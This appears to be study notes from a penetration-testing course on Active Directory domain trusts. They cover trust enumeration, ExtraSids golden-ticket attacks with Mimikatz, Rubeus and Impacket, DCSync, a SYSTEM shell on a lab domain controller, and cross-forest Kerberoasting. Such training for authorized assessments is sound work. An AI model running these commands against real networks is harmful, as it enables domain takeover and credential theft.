+	> We could use a tool such as SharpGPOAbuse(https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar. When using a tool like this, we need to be careful because commands can be run that affect every computer within the OU that the GPO is linked to. If we found an editable GPO that applies to an OU with 1,000 computers, we would not want to make the mistake of adding ourselves as a local admin to that many hosts. Some of the attack options available with this tool allow us to specify a target user or host. The hosts shown in the above image are not exploitable, and GPO attacks will be covered in-depth in a later module.
+
+* Onwards
+	> We have seen various misconfigurations that we may run into during an assessment, and there are many more that will be covered in more advanced Active Directory modules. It is worth familiarizing ourselves with as many attacks as possible, so we recommend doing some research on topics such as:
+
+    		- Active Directory Certificate Services (AD CS) attacks
+    		- Kerberos Constrained Delegation
+    		- Kerberos Unconstrained Delegation
+    		- Kerberos Resource-Based Constrained Delegation (RBCD)
+
+-=-=-=-=-=
+[+] Domain Trusts Primer 
+
+* Scenario
+	> Many large organizations will acquire new companies over time and bring them into the fold. One way this is done for ease of use is to establish a trust relationship with the new domain. In doing so, you can avoid migrating all the established objects, making integration much quicker. This trust can also introduce weaknesses into the customer's environment if they are not careful. A subdomain with an exploitable flaw or vulnerability can provide us with a quick route into the target domain. Companies may also establish trusts with other companies (such as an MSP), a customer, or other business units of the same company (such as a division of the company in another geographical region). Let's explore domain trusts more and how we can abuse built-in functionality during our assessments.
+
+* Domain Trusts Overview
+	> A trust(https://social.technet.microsoft.com/wiki/contents/articles/50969.active-directory-forest-trust-attention-points.aspx) is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides. A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication. An organization can create various types of trusts:
+		- Parent-child: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain corp.inlanefreight.local could authenticate into the parent domain inlanefreight.local, and vice-versa.
+    		- Cross-link: A trust between child domains to speed up authentication.
+    		- External: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID(https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) filtering or filters out authentication requests (by SID) not from the trusted domain.
+    		- Tree-root: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.
+    		- Forest: A transitive trust between two forest root domains.
+    		- ESAE(https://docs.microsoft.com/en-us/security/compass/esae-retirement): A bastion forest used to manage Active Directory.
+
+	> When establishing a trust, certain elements can be modified depending on the business case.
+	> Trusts can be transitive or non-transitive.
+    		- A transitive trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if Domain A has a trust with Domain B, and Domain B has a transitive trust with Domain C, then Domain A will automatically trust Domain C.
+    		- In a non-transitive trust, the child domain itself is the only one trusted.
+	> (https://academy.hackthebox.com/storage/modules/143/transitive-trusts.png)
+	> Adapted from here => (https://zindagitech.com/wp-content/uploads/2021/09/Picture2-Deepak-4.png.webp)
+
+	> Trust Table Side By Side
+		- Transitive 									Non-Transitive
+		   Shared, 1 to many 								Direct trust
+		   The trust is shared with anyone in the forest 				Not extended to next level child domains
+		   Forest, tree-root, parent-child, and cross-link trusts are transitive 	Typical for external or custom trust setups
+
+	> An easy comparison to make can be package delivery to your house. For a transitive trust, you have extended the permission to anyone in your household (forest) to accept a package on your behalf. For a non-transitive trust, you have given strict orders with the package that no one other than the delivery service and you can handle the package, and only you can sign for it.
+	> Trusts can be set up in two directions: one-way or two-way (bidirectional).
+    		- One-way trust: Users in a trusted domain can access resources in a trusting domain, not vice-versa.
+    		- Bidirectional trust: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between INLANEFREIGHT.LOCAL and FREIGHTLOGISTICS.LOCAL, users in INLANEFREIGHT.LOCAL would be able to access resources in FREIGHTLOGISTICS.LOCAL, and vice-versa.
+
+	> Domain trusts are often set up incorrectly and can provide us with critical unintended attack paths. Also, trusts set up for ease of use may not be reviewed later for potential security implications if security is not considered before establishing the trust relationship. A Merger & Acquisition (M&A) between two companies can result in bidirectional trusts with acquired companies, which can unknowingly introduce risk into the acquiring company’s environment if the security posture of the acquired company is unknown and untested. If someone wanted to target your organization, they could also look at the other company you acquired for a potentially softer target to attack, allowing them to get into your organization indirectly. It is not uncommon to be able to perform an attack such as Kerberoasting against a domain outside the principal domain and obtain a user that has administrative access within the principal domain. I have performed many penetration tests where this was the case: I was unable to find a foothold in the principal domain, but was able to find a flaw in a trusted domain which, in turn, gave me a foothold, or even full admin rights in the principal domain. This type of "end-around" attack could be prevented if security is considered as paramount before establishing any kind of domain trust. As we examine trust relationships, keep these thoughts in mind for reporting. Often, we will find that the larger organization is unaware that a trust relationship exists with one or more domains.
+
+	> Below is a graphical representation of the various trust types.
+		(https://academy.hackthebox.com/storage/modules/143/trusts-diagram.png)
+
+* Enumerating Trust Relationships
+	> We can use the Get-ADTrust cmdlet to enumerate domain trust relationships. This is especially helpful if we are limited to just using built-in tools.
+	> Using Get-ADTrust
+		PS C:\htb> Import-Module activedirectory
+		PS C:\htb> Get-ADTrust -Filter *
+			Direction               : BiDirectional
+			DisallowTransivity      : False
+			DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+			ForestTransitive        : False
+			IntraForest             : True
+			IsTreeParent            : False
+			IsTreeRoot              : False
+			Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
+			ObjectClass             : trustedDomain
+			ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
+			SelectiveAuthentication : False
+			SIDFilteringForestAware : False
+			SIDFilteringQuarantined : False
+			Source                  : DC=INLANEFREIGHT,DC=LOCAL
+			Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
+			TGTDelegation           : False
+			TrustAttributes         : 32
+			TrustedPolicy           :
+			TrustingPolicy          :
+			TrustType               : Uplevel
+			UplevelOnly             : False
+			UsesAESKeys             : False
+			UsesRC4Encryption       : False
+			
+			Direction               : BiDirectional
+			DisallowTransivity      : False
+			DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+			ForestTransitive        : True
+			IntraForest             : False
+			IsTreeParent            : False
+			IsTreeRoot              : False
+			Name                    : FREIGHTLOGISTICS.LOCAL
+			ObjectClass             : trustedDomain
+			ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
+			SelectiveAuthentication : False
+			SIDFilteringForestAware : False
+			SIDFilteringQuarantined : False
+			Source                  : DC=INLANEFREIGHT,DC=LOCAL
+			Target                  : FREIGHTLOGISTICS.LOCAL
+			TGTDelegation           : False
+			TrustAttributes         : 8
+			TrustedPolicy           :
+			TrustingPolicy          :
+			TrustType               : Uplevel
+			UplevelOnly             : False
+			UsesAESKeys             : False
+			UsesRC4Encryption       : False
+
+
+	> The above output shows that our current domain INLANEFREIGHT.LOCAL has two domain trusts. The first is with LOGISTICS.INLANEFREIGHT.LOCAL, and the IntraForest property shows that this is a child domain, and we are currently positioned in the root domain of the forest. The second trust is with the domain FREIGHTLOGISTICS.LOCAL, and the ForestTransitive property is set to True, which means that this is a forest trust or external trust. We can see that both trusts are set up to be bidirectional, meaning that users can authenticate back and forth across both trusts. This is important to note down during an assessment. If we cannot authenticate across a trust, we cannot perform any enumeration or attacks across the trust.
+	> Aside from using built-in AD tools such as the Active Directory PowerShell module, both PowerView and BloodHound can be utilized to enumerate trust relationships, the type of trusts established, and the authentication flow. After importing PowerView, we can use the Get-DomainTrust function to enumerate what trusts exist, if any.
+	> Checking for Existing Trusts using Get-DomainTrust
+		PS C:\htb> Get-DomainTrust 
+			SourceName      : INLANEFREIGHT.LOCAL
+			TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
+			TrustType       : WINDOWS_ACTIVE_DIRECTORY
+			TrustAttributes : WITHIN_FOREST
+			TrustDirection  : Bidirectional
+			WhenCreated     : 11/1/2021 6:20:22 PM
+			WhenChanged     : 2/26/2022 11:55:55 PM
+			
+			SourceName      : INLANEFREIGHT.LOCAL
+			TargetName      : FREIGHTLOGISTICS.LOCAL
+			TrustType       : WINDOWS_ACTIVE_DIRECTORY
+			TrustAttributes : FOREST_TRANSITIVE
+			TrustDirection  : Bidirectional
+			WhenCreated     : 11/1/2021 8:07:09 PM
+			WhenChanged     : 2/27/2022 12:02:39 AM
+
+	> PowerView can be used to perform a domain trust mapping and provide information such as the type of trust (parent/child, external, forest) and the direction of the trust (one-way or bidirectional). This information is beneficial once a foothold is obtained, and we plan to compromise the environment further.
+	> Using Get-DomainTrustMapping
+		PS C:\htb> Get-DomainTrustMapping
+			SourceName      : INLANEFREIGHT.LOCAL
+			TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
+			TrustType       : WINDOWS_ACTIVE_DIRECTORY
+			TrustDirection  : Bidirectional
+			WhenCreated     : 11/1/2021 6:20:22 PM
+			WhenChanged     : 2/26/2022 11:55:55 PM
+			
+			SourceName      : INLANEFREIGHT.LOCAL
+			TargetName      : FREIGHTLOGISTICS.LOCAL
+			TrustType       : WINDOWS_ACTIVE_DIRECTORY
+			TrustAttributes : FOREST_TRANSITIVE
+			TrustDirection  : Bidirectional
+			WhenCreated     : 11/1/2021 8:07:09 PM
+			WhenChanged     : 2/27/2022 12:02:39 AM
+			
+			SourceName      : FREIGHTLOGISTICS.LOCAL
+			TargetName      : INLANEFREIGHT.LOCAL
+			TrustType       : WINDOWS_ACTIVE_DIRECTORY
+			TrustAttributes : FOREST_TRANSITIVE
+			TrustDirection  : Bidirectional
+			WhenCreated     : 11/1/2021 8:07:08 PM
+			WhenChanged     : 2/27/2022 12:02:41 AM
+			
+			SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
+			TargetName      : INLANEFREIGHT.LOCAL
+			TrustType       : WINDOWS_ACTIVE_DIRECTORY
+			TrustAttributes : WITHIN_FOREST
+			TrustDirection  : Bidirectional
+			WhenCreated     : 11/1/2021 6:20:22 PM
+			WhenChanged     : 2/26/2022 11:55:55 PM
+
+	> From here, we could begin performing enumeration across the trusts. For example, we could look at all users in the child domain:
+	> Checking Users in the Child Domain using Get-DomainUser
+		PS C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
+
+	> Another tool we can use to get Domain Trust is netdom. The netdom query sub-command of the netdom command-line tool in Windows can retrieve information about the domain, including a list of workstations, servers, and domain trusts.
+	> Using netdom to query domain trust
+		C:\htb> netdom query /domain:inlanefreight.local trust
+	> Using netdom to query domain controllers
+		C:\htb> netdom query /domain:inlanefreight.local dc
+	> Using netdom to query workstations and servers
+		C:\htb> netdom query /domain:inlanefreight.local workstation
+
+	> We can also use BloodHound to visualize these trust relationships by using the Map Domain Trusts pre-built query. Here we can easily see that two bidirectional trusts exist.
+
+* Onwards
+
+	> In the following few sections, we will cover common attacks that we can perform against child --> parent domain trusts and across bidirectional forest trusts. These types of attacks should not be overlooked, but we should always check with our client to ensure that any trusts we uncover during our enumeration are in scope for the assessment and we are not going outside the Rules of Engagement.
+
+-=-=
+[+] Attacking Domain Trusts - Child -> Parent Trusts - from Windows
+
+* SID History Primer
+	> The sidHistory(https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.
+	> SID history is intended to work across domains, but can work in the same domain. Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging in with this account, all of the SIDs associated with the account are added to the user's token.
+	> This token is used to determine what resources the account can access. If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a Golden Ticket or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.
+
+* ExtraSids Attack - Mimikatz
+	> This attack allows for the compromise of a parent domain once the child domain has been compromised. Within the same AD forest, the sidHistory property is respected due to a lack of SID Filtering protection. SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. In this case, we will leverage the SIDHistory to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.
+	> To perform this attack after compromising a child domain, we need the following:
+    		- The KRBTGT hash for the child domain
+    		- The SID for the child domain
+    		- The name of a target user in the child domain (does not need to exist!)
+    		- The FQDN of the child domain.
+    		- The SID of the Enterprise Admins group of the root domain.
+    		- With this data collected, the attack can be performed with Mimikatz.
+	> Now we can gather each piece of data required to perform the ExtraSids attack. First, we need to obtain the NT hash for the KRBTGT account, which is a service account for the Key Distribution Center (KDC) in Active Directory. The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments. The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account, which should be done periodically and definitely after a penetration test assessment where full domain compromise is reached.
+	> Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.
+	> Obtaining the KRBTGT Account's NT Hash using Mimikatz
+		PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
+
+	> We can use the PowerView Get-DomainSID function to get the SID for the child domain, but this is also visible in the Mimikatz output above.
+	> Using Get-DomainSID
+		PS C:\htb> Get-DomainSID
+
+	> Next, we can use Get-DomainGroup from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. We could also do this with the Get-ADGroup cmdlet with a command such as Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL".
+	> Obtaining Enterprise Admins Group's SID using Get-DomainGroup
+		PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+
+	> At this point, we have gathered the following data points:
+    		- The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f
+    		- The SID for the child domain: S-1-5-21-2806153819-209893948-922872689
+    		- The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: hacker
+    		- The FQDN of the child domain: LOGISTICS.INLANEFREIGHT.LOCAL
+    		- The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519
+
+	> Using Mimikatz and the data listed above, we can create a Golden Ticket to access all resources within the parent domain.
+	> Creating a Golden Ticket with Mimikatz
+		PS C:\htb> mimikatz.exe
+		mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+
+	> We can confirm that the Kerberos ticket for the non-existent hacker user is residing in memory.
+	> Confirming a Kerberos Ticket is in Memory Using klist
+		PS C:\htb> klist
+
+	> From here, it is possible to access any resources within the parent domain, and we could compromise the parent domain in several ways.
+	> Listing the Entire C: Drive of the Domain Controller
+		PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
+
+* ExtraSids Attack - Rubeus
+	> We can also perform this attack using Rubeus. First, again, we'll confirm that we cannot access the parent domain Domain Controller's file system.
+	> Using ls to Confirm No Access Before Running Rubeus
+		PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
+		ls : Access is denied
+
+	> Next, we will formulate our Rubeus command using the data we retrieved above. The /rc4 flag is the NT hash for the KRBTGT account. The /sids flag will tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group in the parent domain.
+	> Creating a Golden Ticket using Rubeus
+		PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+
+	> Once again, we can check that the ticket is in memory using the klist command.
+	> Confirming the Ticket is in Memory Using klist
+		PS C:\htb> klist
+	> Finally, we can test this access by performing a DCSync attack against the parent domain, targeting the lab_adm Domain Admin user.
+	> Performing a DCSync Attack
+		PS C:\Tools\mimikatz\x64> .\mimikatz.exe
+		mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
+* Next Steps
+	> Now that we've walked through child --> parent domain compromise from a Windows attack box, we'll cover a few ways to achieve the same if we are constrained to a Linux attack host.
+
+-=-=
+[+] Attacking Domain Trusts - Child -> Parent Trusts - from Linux
+	> We can also perform the attack shown in the previous section from a Linux attack host. To do so, we'll still need to gather the same bits of information:
+    		- The KRBTGT hash for the child domain
+    		- The SID for the child domain
+    		- The name of a target user in the child domain (does not need to exist!)
+    		- The FQDN of the child domain
+    		- The SID of the Enterprise Admins group of the root domain
+
+	> Once we have complete control of the child domain, LOGISTICS.INLANEFREIGHT.LOCAL, we can use secretsdump.py to DCSync and grab the NTLM hash for the KRBTGT account.
+	> Performing DCSync with secretsdump.py
+		m1l0js@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+
+	> Next, we can use lookupsid.py from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain. In this command, whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup. The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format DOMAIN_SID-RID. For example, from the output below, we can see that the SID of the lab_adm user would be S-1-5-21-2806153819-209893948-922872689-1001.
+	> Performing SID Brute Forcing using lookupsid.py
+		m1l0js@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
+
+	> We can filter out the noise by piping the command output to grep and looking for just the domain SID.
+	> Looking for the Domain SID
+		m1l0js@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+
+	> Next, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (DC01) at 172.16.5.5 and grab the domain SID S-1-5-21-3842939050-3880317879-2865463114 and attach the RID of the Enterprise Admins group. Here is a handy list of well-known SIDs. => (https://adsecurity.org/?p=1001)
+	> Grabbing the Domain SID & Attaching to Enterprise Admin's RID
+		m1l0js@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+
+	> We have gathered the following data points to construct the command for our attack. Once again, we will use the non-existent user hacker to forge our Golden Ticket.
+    		- The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f
+    		- The SID for the child domain: S-1-5-21-2806153819-209893948-922872689
+    		- The name of a target user in the child domain (does not need to exist!): hacker
+    		- The FQDN of the child domain: LOGISTICS.INLANEFREIGHT.LOCAL
+    		- The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519
+
+	> Next, we can use ticketer.py from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by -domain-sid) and the parent domain (specified by -extra-sid).
+	> Constructing a Golden Ticket using ticketer.py
+		m1l0js@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+
+	> The ticket will be saved down to our system as a credential cache (ccache => https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file, which is a file used to hold Kerberos credentials. Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.
+	> Setting the KRB5CCNAME Environment Variable
+		m1l0js@htb[/htb]$ export KRB5CCNAME=hacker.ccache 
+
+	> We can check if we can successfully authenticate to the parent domain's Domain Controller using Impacket's version of Psexec. If successful, we will be dropped into a SYSTEM shell on the target Domain Controller.
+	> Getting a SYSTEM shell using Impacket's psexec.py
+		m1l0js@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+
+	> Impacket also has the tool raiseChild.py, which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. If we walk through the output, we see that it starts by listing out the child and parent domain's fully qualified domain names (FQDN). It then:
+    		- Obtains the SID for the Enterprise Admins group of the parent domain
+    		- Retrieves the hash for the KRBTGT account in the child domain
+    		- Creates a Golden Ticket
+    		- Logs into the parent domain
+    		- Retrieves credentials for the Administrator account in the parent domain
+
+	> Finally, if the target-exec switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.
+	> Performing the Attack with raiseChild.py
+		m1l0js@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+
+
+	> The script lists out the workflow and process in a comment as follows:
+
+	> Though tools such as raiseChild.py can be handy and save us time, it is essential to understand the process and be able to perform the more manual version by gathering all of the required data points. In this case, if the tool fails, we are more likely to understand why and be able to troubleshoot what is missing, which we would not be able to if blindly running this tool. In a client production environment, we should always be careful when running any sort of "autopwn" script like this, and always remain cautious and construct commands manually when possible. Other tools exist which can take in data from a tool such as BloodHound, identify attack paths, and perform an "autopwn" function that can attempt to perform each action in an attack chain to elevate us to Domain Admin (such as a long ACL attack path). I would recommend avoiding tools such as these and work with tools that you understand fully, and will also give you the greatest degree of control throughout the process.
+	> We don't want to tell the client that something broke because we used an "autopwn" script!
+
+* More Fun
+	> In the next section, we will briefly discuss some techniques that can be used for cross-forest trust abuse when we find ourselves in an environment with a bidirectional forest trust (meaning we can authenticate into another forest). We will not cover all possible cross-forest trust attacks, as those will be covered in great detail in later modules.
+
+-=-=-=
+[+] Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
+
+* Cross-Forest Kerberoasting
+
+	> Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold. Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.
+	> We can utilize PowerView to enumerate accounts in a target domain that have SPNs associated with them.
+	> Enumerating Accounts for Associated SPNs Using Get-DomainUser
+		PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+
+	> We see that there is one account with an SPN in the target domain. A quick check shows that this account is a member of the Domain Admins group in the target domain, so if we can Kerberoast it and crack the hash offline, we'd have full admin rights to the target domain.
+	> Enumerating the mssqlsvc Account
+		PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
+
+	> Let's perform a Kerberoasting attack across the trust using Rubeus. We run the tool as we did in the Kerberoasting section, but we include the /domain: flag and specify the target domain.
+	> Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
+		PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+	> We could then run the hash through Hashcat. If it cracks, we've now quickly expanded our access to fully control two domains by leveraging a pretty standard attack and abusing the authentication direction and setup of the bidirectional forest trust.
+
+* Admin Password Re-Use & Group Membership
+
+	> From time to time, we'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. If we can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account or an account that is part of the Enterprise Admins or Domain Admins group in Domain A and Domain B has a highly privileged account with the same name. It is worth checking for password reuse across the two forests in this situation. I occasionally ran into issues where, for example, Domain A would have a user named adm_bob.smith in the Domain Admins group, and Domain B had a user named bsmith_admin. Sometimes, the user would be using the same password in the two domains, and owning Domain A instantly gave me full admin rights to Domain B.
+	> We may also see users or admins from Domain A as members of a group in Domain B. Only Domain Local Groups allow security principals from outside its forest. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.
+	> We can use the PowerView function Get-DomainForeignGroupMember to enumerate groups with users that do not belong to the domain, also known as foreign group membership. Let's try this against the FREIGHTLOGISTICS.LOCAL domain with which we have an external bidirectional forest trust.
+	> Using Get-DomainForeignGroupMember
+		PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+			GroupDomain             : FREIGHTLOGISTICS.LOCAL
+			GroupName               : Administrators
+			GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
+			MemberDomain            : FREIGHTLOGISTICS.LOCAL
+			MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
+			MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
+			                          TICS,DC=LOCAL
+			
+		PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
+			INLANEFREIGHT\administrator
+
+	> The above command output shows that the built-in Administrators group in FREIGHTLOGISTICS.LOCAL has the built-in Administrator account for the INLANEFREIGHT.LOCAL domain as a member. We can verify this access using the Enter-PSSession cmdlet to connect over WinRM.
+	> Accessing DC03 Using Enter-PSSession
+		PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+			[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
+			inlanefreight\administrator
+	> From the command output above, we can see that we successfully authenticated to the Domain Controller in the FREIGHTLOGISTICS.LOCAL domain using the Administrator account from the INLANEFREIGHT.LOCAL domain across the bidirectional forest trust. This can be a quick win after taking control of a domain and is always worth checking for if a bidirectional forest trust situation is present during an assessment and the second forest is in-scope.
+
+* SID History Abuse - Cross Forest
+
+	> SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust. If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest. In the below diagram, we can see an example of the jjones user being migrated from the INLANEFREIGHT.LOCAL domain to the CORP.LOCAL domain in a different forest. If SID filtering is not enabled when this migration is made and the user has administrative privileges (or any type of interesting rights such as ACE entries, access to shares, etc.) in the INLANEFREIGHT.LOCAL domain, then they will retain their administrative rights/access in INLANEFREIGHT.LOCAL while being a member of the new domain, CORP.LOCAL in the second forest. => (https://academy.hackthebox.com/storage/modules/143/sid-history.png)
+	> This attack will be covered in-depth in a later module focusing more heavily on attacking AD trusts.
+
+-=-=-=-=-=
+[+] Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
+
+	> As we saw in the previous section, it is often possible to Kerberoast across a forest trust. If this is possible in the environment we are assessing, we can perform this with GetUserSPNs.py from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the -target-domain flag in our command. Performing this against the FREIGHTLOGISTICS.LOCAL domain, we see one SPN entry for the mssqlsvc account.
+	> Cross-Forest Kerberoasting
+	> Using GetUserSPNs.py
+		m1l0js@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+	> Rerunning the command with the -request flag added gives us the TGS ticket. We could also add -outputfile <OUTPUT FILE> to output directly into a file that we could then turn around and run Hashcat against.
+	> Using the -request Flag
+		m1l0js@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
+
+	> We could then attempt to crack this offline using Hashcat with mode 13100. If successful, we'd be able to authenticate into the FREIGHTLOGISTICS.LOCAL domain as a Domain Admin. If we are successful with this type of attack during a real-world assessment, it would also be worth checking to see if this account exists in our current domain and if it suffers from password re-use. This could be a quick win for us if we have not yet been able to escalate in our current domain. Even if we already have control over the current domain, it would be worth adding a finding to our report if we do find password re-use across similarly named accounts in different domains.
+	> Suppose we can Kerberoast across a trust and have run out of options in the current domain. In that case, it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned.
+* Hunting Foreign Group Membership with Bloodhound-python
+	> As noted in the last section, we may, from time to time, see users or admins from one domain as members of a group in another domain. Since only Domain Local Groups allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship. If we are testing from a Linux host, we can gather this information by using the Python implementation of BloodHound(https://github.com/fox-it/BloodHound.py). We can use this tool to collect data from multiple domains, ingest it into the GUI tool and search for these relationships.
+	> On some assessments, our client may provision a VM for us that gets an IP from DHCP and is configured to use the internal domain's DNS. We will be on an attack host without DNS configured in other instances. In this case, we would need to edit our resolv.conf file to run this tool since it requires a DNS hostname for the target Domain Controller instead of an IP address. We can edit the file as follows using sudo rights. Here we have commented out the current nameserver entries and added the domain name and the IP address of ACADEMY-EA-DC01 as the nameserver.
+	> Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
